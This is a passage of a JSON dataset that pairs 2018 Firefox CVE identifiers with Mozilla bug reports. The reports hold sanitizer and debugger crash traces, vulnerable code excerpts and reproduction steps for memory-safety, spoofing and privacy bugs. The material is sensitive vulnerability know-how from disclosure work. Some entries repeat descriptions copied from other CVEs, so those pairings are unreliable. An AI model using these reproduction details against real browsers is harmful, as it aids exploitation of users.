inside of 88-byte region [0x608000059d20,0x608000059d78) freed by thread T0 (Web Content) here: #0 0x4c6fc2 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7fac2c8bd05a in Shutdown /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1057:3 #2 0x7fac2c8bd05a in nsRefreshDriver::Disconnect() /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2451 #3 0x7fac2cac69e6 in nsPresContext::DetachShell() /builds/worker/workspace/build/src/layout/base/nsPresContext.cpp:1112:21 #4 0x7fac2c91e05a in mozilla::PresShell::Destroy() /builds/worker/workspace/build/src/layout/base/PresShell.cpp:1402:19 #5 0x7fac2ca2d712 in nsDocumentViewer::DestroyPresShell() /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:4614:15 #6 0x7fac2ca2e20c in nsDocumentViewer::SetDocumentInternal(nsIDocument*, bool) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1940:5 #7 0x7fac2bc9def2 in nsXMLContentSink::OnTransformDone(nsresult, nsIDocument*) /builds/worker/workspace/build/src/dom/xml/nsXMLContentSink.cpp:380:20 #8 0x7fac2bc9e0af in non-virtual thunk to nsXMLContentSink::OnTransformDone(nsresult, nsIDocument*) /builds/worker/workspace/build/src/dom/xml/nsXMLContentSink.cpp #9 0x7fac2bd39eaf in txMozillaXSLTProcessor::notifyError() /builds/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1192:16 #10 0x7fac2bd2518c in txMozillaXSLTProcessor::reportError(nsresult, char16_t const*, char16_t const*) /builds/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1119:9 #11 0x7fac2bd5e230 in txStylesheetCompiler::cancel(nsresult, char16_t const*, char16_t const*) /builds/worker/workspace/build/src/dom/xslt/xslt/txStylesheetCompiler.cpp:400:20 #12 0x7fac2bd204e7 in HandleStartElement /builds/worker/workspace/build/src/dom/xslt/xslt/txMozillaStylesheetCompiler.cpp:132:20 #13 0x7fac2bd204e7 in non-virtual thunk to txStylesheetSink::HandleStartElement(char16_t const*, char16_t const**, unsigned int, unsigned int) /builds/worker/workspace/build/src/dom/xslt/xslt/txMozillaStylesheetCompiler.cpp #14 0x7fac26eafb55 in nsExpatDriver::HandleStartElement(char16_t const*, char16_t const**) /builds/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:324:7 #15 0x7fac2da544cb in doContent /builds/worker/workspace/build/src/parser/expat/lib/xmlparse.c:2442:11 #16 0x7fac2da48faa in contentProcessor /builds/worker/workspace/build/src/parser/expat/lib/xmlparse.c:2098:27 #17 0x7fac2da48faa in doProlog /builds/worker/workspace/build/src/parser/expat/lib/xmlparse.c:4078 #18 0x7fac2da3f263 in prologProcessor /builds/worker/workspace/build/src/parser/expat/lib/xmlparse.c:3812:10 #19 0x7fac2da3f263 in prologInitProcessor /builds/worker/workspace/build/src/parser/expat/lib/xmlparse.c:3629 #20 0x7fac2da3d666 in MOZ_XML_Parse /builds/worker/workspace/build/src/parser/expat/lib/xmlparse.c:1530:17 #21 0x7fac26eb5add in nsExpatDriver::ParseBuffer(char16_t const*, unsigned int, bool, unsigned int*) /builds/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:887:16 #22 0x7fac26eb6def in nsExpatDriver::ConsumeToken(nsScanner&, bool&) /builds/worker/workspace/build/src/parser/htmlparser/nsExpatDriver.cpp:985:5 #23 0x7fac26ec3259 in nsParser::Tokenize(bool) /builds/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1539:30 #24 0x7fac26ebf006 in nsParser::ResumeParse(bool, bool, bool) /builds/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1056:41 #25 0x7fac26ec46a7 in nsParser::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /builds/worker/workspace/build/src/parser/htmlparser/nsParser.cpp:1437:12 #26 0x7fac2bd21276 in txStylesheetSink::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /builds/worker/workspace/build/src/dom/xslt/xslt/txMozillaStylesheetCompiler.cpp:248:23 #27 0x7fac25b05172 in nsCORSListenerProxy::OnDataAvailable(nsIRequest*, nsISupports*, nsIInputStream*, unsigned long, unsigned int) /builds/worker/workspace/build/src/netwerk/protocol/http/nsCORSListenerProxy.cpp:668:20 #28 0x7fac25a8bfa3 in DoOnDataAvailable /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:1040:28 #29 0x7fac25a8bfa3 in mozilla::net::HttpChannelChild::OnTransportAndData(nsresult const&, nsresult const&, unsigned long const&, unsigned int const&, nsTString<char> const&) /builds/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:966 #30 0x7fac25c93356 in mozilla::net::ChannelEventQueue::FlushQueue() /builds/worker/workspace/build/src/netwerk/ipc/ChannelEventQueue.cpp:93:12 #31 0x7fac25c9cdbe in MaybeFlushQueue /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/net/ChannelEventQueue.h:329:5 #32 0x7fac25c9cdbe in CompleteResume /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/net/ChannelEventQueue.h:306 #33 0x7fac25c9cdbe in mozilla::net::ChannelEventQueue::ResumeInternal()::CompleteResumeRunnable::Run() /builds/worker/workspace/build/src/netwerk/ipc/ChannelEventQueue.cpp:161 #34 0x7fac2501509a in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:413:25 #35 0x7fac2503b1b6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #36 0x7fac25054970 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 previously allocated by thread T0 (Web Content) here: #0 0x4c7303 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x4f7dcd in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:70:17 #2 0x7fac2c8aae96 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:156:12 #3 0x7fac2c8aae96 in PVsyncActorCreated /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2318 #4 0x7fac2c8aae96 in CreateContentVsyncRefreshTimer /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1007 #5 0x7fac2c8aae96 in CreateVsyncRefreshTimer /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1034 #6 0x7fac2c8aae96 in nsRefreshDriver::ChooseTimer() const /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1142 #7 0x7fac2c8adaaf in nsRefreshDriver::EnsureTimerStarted(nsRefreshDriver::EnsureTimerStartedFlags) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1378:34 #8 0x7fac2c8adf6a in nsRefreshDriver::AddRefreshObserver(nsARefreshObserver*, mozilla::FlushType) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1264:3 #9 0x7fac2b9ec954 in mozilla::dom::CoalescedMouseMoveFlusher::StartObserver() /builds/worker/workspace/build/src/dom/ipc/CoalescedMouseData.cpp:92:23 #10 0x7fac2b9ec2b5 in mozilla::dom::TabChild::ProcessPendingCoalescedMouseDataAndDispatchEvents() /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:1563:32 #11 0x7fac2ba5981d in mozilla::dom::TabChild::RecvRealMouseButtonEvent(mozilla::WidgetMouseEvent const&, mozilla::layers::ScrollableLayerGuid const&, unsigned long const&) /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:1697:5 #12 0x7fac2655264e in mozilla::dom::PBrowserChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBrowserChild.cpp:3470:20 #13 0x7fac266975bb in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PContentChild.cpp:5103:28 #14 0x7fac25ede53e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2134:25 #15 0x7fac25edb594 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2064:17 #16 0x7fac25edccbc in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1910:5 #17 0x7fac25edd318 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1943:15 #18 0x7fac2501509a in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:413:25 #19 0x7fac2503b1b6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #20 0x7fac25054970 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 #21 0x7fac25ee5f0a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #22 0x7fac25e38889 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #23 0x7fac25e38889 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #24 0x7fac25e38889 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #25 0x7fac2c16544a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #26 0x7fac2fa310bb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22 #27 0x7fac25e38889 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #28 0x7fac25e38889 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #29 0x7fac25e38889 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #30 0x7fac2fa30aa4 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:721:34 #31 0x4f6f2c in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #32 0x4f6f2c in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #33 0x7fac4387f82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:313:26 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) Shadow bytes around the buggy address: 0x0c1080003350: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c1080003360: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c1080003370: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c1080003380: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c1080003390: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa =>0x0c10800033a0: fa fa fa fa fd fd[fd]fd fd fd fd fd fd fd fd fa 0x0c10800033b0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c10800033c0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c10800033d0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c10800033e0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c10800033f0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==28373==ABORTING"
      }
    ],
    "CVE-2018-12378": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1459383",
        "title": "Use After Free in indexedDB",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 Steps to reproduce: run firefox with attached html Actual results: https://searchfox.org/mozilla-central/source/dom/indexedDB/KeyPath.cpp#323 nsresult KeyPath::ExtractKey(JSContext* aCx, const JS::Value& aValue, Key& aKey) const { uint32_t len = mStrings.Length(); JS::Rooted<JS::Value> value(aCx); aKey.Unset(); for (uint32_t i = 0; i < len; ++i) { nsresult rv = GetJSValFromKeyPathString(aCx, aValue, mStrings[i], value.address(), DoNotCreateProperties, nullptr, nullptr); if (NS_FAILED(rv)) { return rv; } if (NS_FAILED(aKey.AppendItem(aCx, IsArray() && i == 0, value))) { NS_ASSERTION(aKey.IsUnset(), \"Encoding error should unset\"); return NS_ERROR_DOM_INDEXEDDB_DATA_ERR; } } aKey.FinishArray(); return NS_OK; } GetJSValFromKeyPathString can execute js callback by setting a getter. In the callback, one can call deleteIndex free the KeyPath now using, which make mStrings invalid."
      }
    ],
    "CVE-2018-12379": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1473113",
        "title": "Invalid memcpy in mar_read.c",
        "description": "By opening a mar file which contains a very long item file name (length = max int) it's possible to trigger an invalid memcpy call. This can lead to an out-of-bounds read/write. To reproduce extract the update.mar and try an update with an 64bit updater or use the mar tool like 'mar -t ./update.mar' ASAN-Log: ==11754==ERROR: AddressSanitizer: negative-size-param: (size=-2147483648) #0 0x4bdeb4 in __asan_memcpy moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:23:3 #1 0x500c2a in mar_insert_item src/modules/libmar/src/mar_read.c:44:3 #2 0x500c2a in mar_consume_index src/modules/libmar/src/mar_read.c:109 #3 0x500c2a in mar_read_index src/modules/libmar/src/mar_read.c:142 #4 0x500c2a in mar_fpopen src/modules/libmar/src/mar_read.c:164 #5 0x500c2a in mar_open src/modules/libmar/src/mar_read.c:182 #6 0x4efa94 in ArchiveReader::Open(char const*) src/toolkit/mozapps/update/updater/archivereader.cpp:209:14 #7 0x4f908d in UpdateThreadFunc(void*) src/toolkit/mozapps/update/updater/updater.cpp:2480:27 ..."
      }
    ],
    "CVE-2018-12382": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1479311",
        "title": "Firefox for Android - AddressBar Spoofing using specially-crafted javascript: URL opened in a new tab",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:61.0) Gecko/20100101 Firefox/61.0 Build ID: 20180604143143 Steps to reproduce: When a Malicious web-page on an Attacker Web-Site opens a javascript: URL containing the Attacker Domain (Example: Attacker Domain = www.yyy.com ; javascript URL opened = javascript: [codes] + www.yyy.com + [codes] ) , the Attacker Domain is visible at the right into the AddressBar and covers the javascript: Protocol, so at the left into the AddressBar it is possible to show another Domain (ex: www.google.com ; www.bankofamerica.com …). This can lead to AddressBar Spoofing (The Video Demo in Attachments will show you how this vulnerability works). STR: -1) Go to the TestCase URL and Click on the « ClickMe » link (The specially-crafted javascript: URL is now opened in a new tab). This javascript: URL opened in a new tab can lead to AddressBar Spoofing. Actual results: The specially-crafted javascript: URL can lead to AddressBar Spoofing (As demonstrated in the video-demo in Attachments). Expected results: A possibility to fix this vulnerability: the specially-crafted javascript URL should be visible like others javascript URL (The javascript protocol should be always visible into the Address Bar)"
      }
    ],
    "CVE-2018-12385": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1490585",
        "title": "Startup crash in nsSSLStatus::~nsSSLStatus after downgrading profile",
        "description": "This bug was filed from the Socorro interface and is report bp-b21e8499-5fa4-4bed-9d81-2c19f0180912. ============================================================= Top 10 frames of crashing thread: 0 xul.dll nsSSLStatus::~nsSSLStatus security/manager/ssl/nsSSLStatus.h:34 1 xul.dll nsSSLStatus::Release security/manager/ssl/nsSSLStatus.cpp:387 2 xul.dll mozilla::psm::TransportSecurityInfo::~TransportSecurityInfo security/manager/ssl/TransportSecurityInfo.h:35 3 xul.dll mozilla::psm::TransportSecurityInfo::`scalar deleting destructor' 4 xul.dll mozilla::psm::TransportSecurityInfo::Release security/manager/ssl/TransportSecurityInfo.cpp:50 5 xul.dll nsBinaryInputStream::ReadObject xpcom/io/nsBinaryStream.cpp:989 6 xul.dll NS_DeserializeObject netwerk/base/nsSerializationHelper.cpp:48 7 xul.dll mozilla::net::CacheEntry::GetSecurityInfo netwerk/cache2/CacheEntry.cpp:1365 8 xul.dll mozilla::net::CacheEntryHandle::GetSecurityInfo netwerk/cache2/CacheEntry.h:451 9 xul.dll mozilla::net::nsHttpChannel::OpenCacheInputStream netwerk/protocol/http/nsHttpChannel.cpp:4698 ============================================================= this startup crash signature is taking off in volume over the past hours: https://crash-stats.mozilla.com/signature/?product=Firefox&signature=nsSSLStatus%3A%3A~nsSSLStatus&date=%3E%3D2018-08-29#graphs we have users linking that to installing the latest windows updates from yesterday's windows updates which would fit timing-wise, as the signature started increasing then across multiple release channels: https://support.mozilla.org/en-US/questions/1233386"
      }
    ],
    "CVE-2018-12387": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1493903",
        "title": "Infoleak bug from Hack2Win",
        "description": "We received the 2018 Hack2Win Firefox Infoleak exploit from Noam Rathaus of Beyond Security. Please use the following for the acknowledgement. \"Two independent security researcher, Bruno Keith and Niklas Baumstark, have reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.\""
      }
    ],
    "CVE-2018-12388": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1472639%2C1485698%2C1301547%2C1471427%2C1379411%2C1482122%2C1486314%2C1487167",
        "description": "We received the 2018 Hack2Win Firefox Infoleak exploit from Noam Rathaus of Beyond Security. Please use the following for the acknowledgement. \"Two independent security researcher, Bruno Keith and Niklas Baumstark, have reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.\""
      }
    ],
    "CVE-2018-12389": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1498460%2C1499198",
        "description": "We received the 2018 Hack2Win Firefox Infoleak exploit from Noam Rathaus of Beyond Security. Please use the following for the acknowledgement. \"Two independent security researcher, Bruno Keith and Niklas Baumstark, have reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.\""
      }
    ],
    "CVE-2018-12390": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1487098%2C1487660%2C1490234%2C1496159%2C1443748%2C1496340%2C1483905%2C1493347%2C1488803%2C1498701%2C1498482%2C1442010%2C1495245%2C1483699%2C1469486%2C1484905%2C1490561%2C1492524%2C1481844",
        "description": "We received the 2018 Hack2Win Firefox Infoleak exploit from Noam Rathaus of Beyond Security. Please use the following for the acknowledgement. \"Two independent security researcher, Bruno Keith and Niklas Baumstark, have reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.\""
      }
    ],
    "CVE-2018-12393": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1495011",
        "title": "Unsafe use of CheckedInt (possible buffer overflow) in ScriptLoader::ConvertToUTF16",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20100101 Steps to reproduce: The issue is in ScriptLoader::ConvertToUTF16 (https://searchfox.org/mozilla-central/source/dom/script/ScriptLoader.cpp) : CheckedInt<size_t> unicodeLength = unicodeDecoder->MaxUTF16BufferLength(aLength); if (!unicodeLength.isValid()) { return NS_ERROR_OUT_OF_MEMORY; } aBufOut = static_cast<char16_t*>(js_malloc(unicodeLength.value() * sizeof(char16_t))); if (!aBufOut) { aLengthOut = 0; return NS_ERROR_OUT_OF_MEMORY; } At line 2826, unicodeLength is calculated and sanitized against an integer overflow via the CheckedInt class. However just a few lines below, the raw value of unicodeLength (unicodeLength.value()) is multiplied by 2 (=sizeof(char16_t)) and thus can cause an overflow! In such case js_malloc will allocate a smaller buffer than required, will all the usual arbitrary out-of-bounds write consequences. It's not clear whether any checks in the (multiple) callers sanitize away the overflow window, however the fact that this code uses the CheckedInt class strongly suggests that either it has overflowed in the past, or it has a potential for the overflow. I checked the crash stats and they do contain quite a few bugs around this code, but maybe not all of them due to this specific issue."
      }
    ],
    "CVE-2018-12397": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1487478",
        "title": "\"file:///*\" extension permission has no warning",
        "description": "When an extension requests the \"file:///*\" permission, it gets access to local files, but there are no permission warnings (unlike \"file://*/*\", which has the \"Access your data for all websites\" warning). 1. Visit about:config and set xpinstall.signatures.required to false (requires Nightly or unbranded build). 2. Install the attached xpi file. 3. Visit a local file or directory in the browser. Expected: - At step 2, a warning should be displayed about the fact that extensions can access local files. - At step 3, the local file should have a pink background (=extension ran script in the file). (alternatively, depending on the resolution of bug 1487353, the local file should not be pink, and the warning at step 2 is not relevant) Actual: - At step 2, no warnings are displayed."
      }
    ],
    "CVE-2018-12399": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1490276",
        "title": "UI spoof when adding protocol handler",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36 Firefox for Android Steps to reproduce: online demo: http://f.3cm.me/r/phandler_spoof.html attacker could spoof the handler's domain. Actual results: see protocal_handler.jpg Expected results: function registerProtocolHandler('mailto', 'url', 'title'); It should just show adding \"title\" on f.3cm as an application for mailto links"
      }
    ],
    "CVE-2018-12400": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1448305",
        "title": "Private browsing mode leaks site visits via cached favicons",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20100101 Steps to reproduce: 1. Open Firefox for Android 2. Open new tab 3. Visit sites: a. https://xvideos.com b. http://spiegel.de 4. Close the browser 5. Restart the browser Actual results: Domains with touch-icon in HTML seem to leave an entry in `cache/icons` folder. Furthermore, it also reveals the number of page loads, because new unique page seems to save a new entry for the touch-icon. As in the screenshot you can see, I visited three different pages on spiegel.de, and it saved touch icon three times. Screenshots attached. Expected results: Expectation is: Private browsing does not leave any footprint on the device about domains visited. But in this case, domains can be known. Also, I did not check, but the cache file name looks like a hash, did not confirm if it's hash based on a URL or not."
      }
    ],
    "CVE-2018-12401": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1422456",
        "title": "about:home crashes whole browser (possible memory corruption)",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: Visit the following URL: about:home?1:q \"MOZ_CRASH(Should never get here!)\" is the reason. Actual results: Report: https://crash-stats.mozilla.com/report/index/5bd57607-cb08-4606-b085-9755d0171202#tab-details Expected results: No crash. Also I will mark as sensitive since I am seeing the words \"MEMORY_CORRUPTION_LARGE_80000003_memory_corruption!KERNEL32\" in my windbg, though I'm not sure if it is. Also, about:home is linkable from web content, so if this was exploitable its even more dangerous as it requires no user interaction."
      }
    ],
    "CVE-2018-12405": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1494752%2C1498765%2C1503326%2C1505181%2C1500759%2C1504365%2C1506640%2C1503082%2C1502013%2C1510471",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: Visit the following URL: about:home?1:q \"MOZ_CRASH(Should never get here!)\" is the reason. Actual results: Report: https://crash-stats.mozilla.com/report/index/5bd57607-cb08-4606-b085-9755d0171202#tab-details Expected results: No crash. Also I will mark as sensitive since I am seeing the words \"MEMORY_CORRUPTION_LARGE_80000003_memory_corruption!KERNEL32\" in my windbg, though I'm not sure if it is. Also, about:home is linkable from web content, so if this was exploitable its even more dangerous as it requires no user interaction."
      }
    ],
    "CVE-2018-12406": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1456947%2C1475669%2C1504816%2C1502886%2C1500064%2C1500310%2C1500696%2C1499198%2C1434490%2C1481745%2C1458129",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: Visit the following URL: about:home?1:q \"MOZ_CRASH(Should never get here!)\" is the reason. Actual results: Report: https://crash-stats.mozilla.com/report/index/5bd57607-cb08-4606-b085-9755d0171202#tab-details Expected results: No crash. Also I will mark as sensitive since I am seeing the words \"MEMORY_CORRUPTION_LARGE_80000003_memory_corruption!KERNEL32\" in my windbg, though I'm not sure if it is. Also, about:home is linkable from web content, so if this was exploitable its even more dangerous as it requires no user interaction."
      }
    ],
    "CVE-2018-12407": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1505973",
        "title": "Mozilla Firefox \"VertexBuffer11\" Heap Overflow Code Execution Vulnerability (iDefense Zero Day)",
        "description": "We received the following submission from iDefense today: iDefense VCP Submission V-6v2c5n6tc4 11/08/2018 Mozilla Firefox \"VertexBuffer11\" Heap Overflow Code Execution Vulnerability (iDefense Zero Day) Description: Remote exploitation of a heap overflow vulnerability in Mozilla Foundation's Firefox could allow an attacker to execute arbitrary code with the privileges of the current user. Analysis: A heap overflow vulnerability has been identified in Firefox . This vulnerability can be triggered by manipulating the HTML elements within a website using javascript. Specifically, the error occurs in the way a heap based buffer in a certain function within the VertexBuffer11 module is managed in memory. This condition can cause memory corruption, leading to the execution of arbitrary code. Credit: Omair working with iDefense Labs Tested on Windows 10 x64 and Firefox 63.0 The vulnerability is in ANGLE used by Firefox for WebGL which results in heap corruption. 6:251> r rax=000001a777880000 rbx=000001a701436400 rcx=00007ffdc574cab1 rdx=000001a6b3508502 rsi=000001a777880000 rdi=000001a7012eaf40 rip=00007ffdc574cab1 rsp=000000433dbfce88 rbp=00007ffd820b0b90 r8=0000000000000002 r9=00007ffdc5740000 r10=000001a6b3508502 r11=000001a777880000 r12=000001a6b3508502 r13=0000000000000002 r14=0000000000000001 r15=000000433dbfda48 iopl=0 nv up ei pl nz na po nc cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206 VCRUNTIME140!MoveSmall+0x4a: 00007ffd`c574cab1 0fb70a movzx ecx,word ptr [rdx] ds:000001a6`b3508502=???? 6:251> k # Child-SP RetAddr Call Site 00 00000043`3dbfce88 00007ffd`81f67860 VCRUNTIME140!memcpy+0xe1 01 00000043`3dbfce90 00007ffd`81efeb69 libGLESv2!rx::VertexBuffer11::storeVertexAttributes+0x250 [z:\\build\\build\\src\\gfx\\angle\\checkout\\src\\libANGLE\\renderer\\d3d\\d3d11\\VertexBuffer11.cpp @ 130] 02 00000043`3dbfd020 00007ffd`81f00ae1 libGLESv2!rx::StreamingVertexBufferInterface::storeDynamicAttribute+0x309 [z:\\build\\build\\src\\gfx\\angle\\checkout\\src\\libANGLE\\renderer\\d3d\\VertexBuffer.cpp @ 178] 03 00000043`3dbfd1d0 00007ffd`81f67038 libGLESv2!rx::VertexDataManager::storeDynamicAttribs+0x561 [z:\\build\\build\\src\\gfx\\angle\\checkout\\src\\libANGLE\\renderer\\d3d\\VertexDataManager.cpp @ 427] 04 00000043`3dbfd3e0 00007ffd`81f44fa3 libGLESv2!rx::VertexArray11::syncStateForDraw+0x538 [z:\\build\\build\\src\\gfx\\angle\\checkout\\src\\libANGLE\\renderer\\d3d\\d3d11\\VertexArray11.cpp @ 144] 05 00000043`3dbfd5d0 00007ffd`81f17d0c libGLESv2!rx::StateManager11::updateState+0x6f3 [z:\\build\\build\\src\\gfx\\angle\\checkout\\src\\libANGLE\\renderer\\d3d\\d3d11\\StateManager11.cpp @ 2036] 06 00000043`3dbfd9c0 00007ffd`81decce9 libGLESv2!rx::Context11::drawElements+0x2c [z:\\build\\build\\src\\gfx\\angle\\checkout\\src\\libANGLE\\renderer\\d3d\\d3d11\\Context11.cpp @ 265] 07 00000043`3dbfda10 00007ffd`81d794b7 libGLESv2!gl::Context::drawElements+0xa9 [z:\\build\\build\\src\\gfx\\angle\\checkout\\src\\libANGLE\\Context.cpp @ 2100] 08 00000043`3dbfda90 00007ffd`687a0c7a libGLESv2!gl::DrawElements+0x137 [z:\\build\\build\\src\\gfx\\angle\\checkout\\src\\libGLESv2\\entry_points_gles_2_0_autogen.cpp @ 787] 09 00000043`3dbfdb10 00007ffd`6940b6c9 xul!mozilla::gl::GLContext::raw_fDrawElements+0x3a [z:\\build\\build\\src\\gfx\\gl\\GLContext.h @ 1105] 0a 00000043`3dbfdb60 00007ffd`69034e82 xul!mozilla::WebGLContext::DrawElementsInstanced+0x4c9 